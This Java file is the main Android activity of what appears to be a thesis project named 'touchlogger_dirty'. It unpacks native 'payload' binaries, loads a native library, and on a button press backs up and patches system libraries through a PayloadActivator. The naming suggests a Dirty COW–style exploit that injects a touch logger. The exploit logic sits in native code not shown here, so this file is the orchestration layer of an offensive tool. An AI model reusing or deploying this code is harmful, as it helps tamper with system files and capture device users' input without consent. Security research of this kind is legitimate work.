package org.leyfer.thesis.touchlogger_dirty.activity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import org.leyfer.thesis.touchlogger_dirty.R;
import org.leyfer.thesis.touchlogger_dirty.activation.PayloadActivator;
import org.leyfer.thesis.touchlogger_dirty.dialog.ErrorAlertDialog;
import org.leyfer.thesis.touchlogger_dirty.handler.InjectProgressHandler;
import org.leyfer.thesis.touchlogger_dirty.utils.Config;
import org.leyfer.thesis.touchlogger_dirty.utils.JNIAPI;

import java.io.File;

import static org.leyfer.thesis.touchlogger_dirty.utils.FileUtils.unpackAsset;

public class MainActivity extends AppCompatActivity {

    public static final String TAG = "TouchLoggeer-dirty";
    private static final int PERMISSION_REQUEST_WRITE_EXTERNAL_STORAGE = 1;
    private static final String EXTRA_STARTED_BY_PAYLOAD = "org.leyfer.thesis.extra.started_by_payload";
    private Handler mHandler;

    @SuppressLint("UnsafeDynamicallyLoadedCode")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        checkPermissions();

        if (unpackAssets()) {
            PayloadActivator.getInstance().setLocalPath(
                    MainActivity.this.getFilesDir().getAbsolutePath());
            System.load(new File(this.getFilesDir(), Config.MAIN_LIBRARY_NAME).getAbsolutePath());
        } else {
            Log.e(TAG, "Unable to unpack assets!");
            return;
        }

        setContentView(R.layout.activity_main);

        TextView tv = (TextView) findViewById(R.id.sample_text);

        Bundle extras = this.getIntent().getExtras();
        boolean startedByPayload = false;
        if (extras != null) {
            startedByPayload = extras.getBoolean(EXTRA_STARTED_BY_PAYLOAD, false);
            if (startedByPayload) {
                tv.setText(R.string.started_by_payload);
            } else {
                tv.setText(JNIAPI.stringFromJNI());
            }
        } else {
            tv.setText(JNIAPI.stringFromJNI());
        }

        mHandler = new InjectProgressHandler(this);

        if (!startedByPayload) {
            Button button = (Button) findViewById(R.id.button);
            button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            if (!PayloadActivator.getInstance().backupTargets()) {
                                Log.e(TAG, "Unable to create backup of system files!");
                                mHandler.sendEmptyMessage(
                                        InjectProgressHandler.MSG_INJECT_DEPENDENCY_FAIL);
                                return;
                            }

                            if (PayloadActivator.getInstance().patchTargetLibrary()) {
                                Log.d(TAG, "Patching target library finished!");
                                mHandler.sendEmptyMessage(
                                        InjectProgressHandler.MSG_INJECT_DEPENDENCY_SUCCESS);
                            } else {
                                Log.e(TAG, "Unable to patch system libraries!");
                                mHandler.sendEmptyMessage(
                                        InjectProgressHandler.MSG_INJECT_DEPENDENCY_FAIL);
                            }
                        }
                    }).start();
                }
            });
        }
    }

    private boolean unpackAssets() {
        String abi;
        if (android.os.Build.VERSION.SDK_INT
                >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            abi = Build.SUPPORTED_ABIS[0];
        } else {
            abi = Build.CPU_ABI;
        }

        File dirtyCopyPath = unpackAsset(MainActivity.this,
                String.format("%s/%s", abi, Config.MAIN_LIBRARY_NAME),
                Config.MAIN_LIBRARY_NAME);

        File sharedPayloadPath = unpackAsset(MainActivity.this,
                String.format("%s/%s", abi, Config.SHARED_PAYLOAD_NAME),
                Config.SHARED_PAYLOAD_NAME);

        File execPayloadPath = unpackAsset(MainActivity.this,
                String.format("%s/%s", abi, Config.EXEC_PAYLOAD_NAME),
                Config.EXEC_PAYLOAD_NAME);

        return sharedPayloadPath != null
                && sharedPayloadPath.exists()
                && execPayloadPath != null
                && execPayloadPath.exists()
                && dirtyCopyPath != null
                && dirtyCopyPath.exists();
    }

    private void checkPermissions() {
        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    PERMISSION_REQUEST_WRITE_EXTERNAL_STORAGE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_WRITE_EXTERNAL_STORAGE:
                boolean writeExternalStoragePermission = false;

                for (int i = 0; i < permissions.length; i++) {
                    if (permissions[i].equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                        writeExternalStoragePermission =
                                (grantResults[i] == PackageManager.PERMISSION_GRANTED);
                    }
                }

                if (!writeExternalStoragePermission) {
                    ErrorAlertDialog errorAlertDialog = new ErrorAlertDialog(this, "Unable to access external storage!");
                    errorAlertDialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
                        @Override
                        public void onDismiss(DialogInterface dialog) {
                            MainActivity.this.finish();
                        }
                    });
                    errorAlertDialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
                         @Override
                         public void onCancel(DialogInterface dialog) {
                             MainActivity.this.finish();
                         }
                     });

                    errorAlertDialog.show();
                }
                break;
            default:
                break;
        }
    }
}
